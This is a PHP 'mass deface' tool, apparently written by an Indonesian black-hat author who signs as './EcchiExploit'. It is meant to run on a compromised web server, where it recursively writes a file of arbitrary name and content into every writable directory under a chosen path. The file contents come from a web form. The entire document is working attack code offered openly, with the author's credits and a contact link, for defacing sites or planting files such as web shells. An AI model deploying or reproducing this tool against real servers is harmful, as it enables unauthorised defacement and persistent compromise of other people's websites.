<?php
// Blackhat Hacker Indonesia
// Simple Tool Mass Deface By ./EcchiExploit

if(isset($_GET['direc'])) {
	$direc = $_GET['direc'];
	chdir($direc);
} else {
	$direc = getcwd();
}
$direc = str_replace("\\","/",$direc);

function bikin_file($namafile,$script){
$fp2 = fopen($namafile,"w");
fputs($fp2,$script);
}

function buka_dir($getcwd){
	if(is_writable($getcwd)){
	$nama = $_POST['nama'];
	$script = $_POST['script'];
	$a = scandir("$getcwd");
foreach($a as $aa){
	if($aa == "." | $aa == ".."){
	}
	elseif(is_dir("$getcwd/$aa")){

		$dir_baru = "$getcwd/$aa";
		if(is_writable($dir_baru)){
		echo "$dir_baru/$nama <== <font color='lime'>sukses</font><br>";
		$create_file = bikin_file("$dir_baru/$nama", "$script");
		$baa = buka_dir($dir_baru);
	}
	else{
		echo "<font color='red'>gagal dir not writeable</font>";
	}
}
}	
}
else{
	echo "<font color='lime'>gagal dir not writeable</font>";
}
}
if($_POST){
$cwd = $_POST['dir'];
$coba = buka_dir($cwd);
echo $coba;
}
else{
	echo '<html>
	<head>
		<title>Created By ./EcchiExploit</title>
	</head>
	<center>
<img src="https://i.ibb.co/WH4DrnR/IMG-20190901-WA0263.jpg" alt="IMG-20190901-WA0263" border="0" height="100px" width="200px">
	<body>
			<center>
				<font size="7">Coded By ./EcchiExploit</font>
						<table>
							<tr><td><form method="post" action="?action"></td></tr>
							<tr><td><input type="text" name="dir" value="'.$direc.'"></td> </tr>
							<tr><td><input type="text" name="nama" placeholder="kerens.php / Nama Filenya"></td> </tr>
							<tr><td><textarea rows="10" cols="19px" name="script" placeholder="Hacked By EcchiExploit/ Script"></textarea></td></tr>

							<br><tr><td><input type="submit" value="Submit"></td></tr>
							</form>
						</table>
						<font color="red">*contact:fb.com/dmz.hari.9
						</font>
			</center>

	</body>
</html>';
}
?>
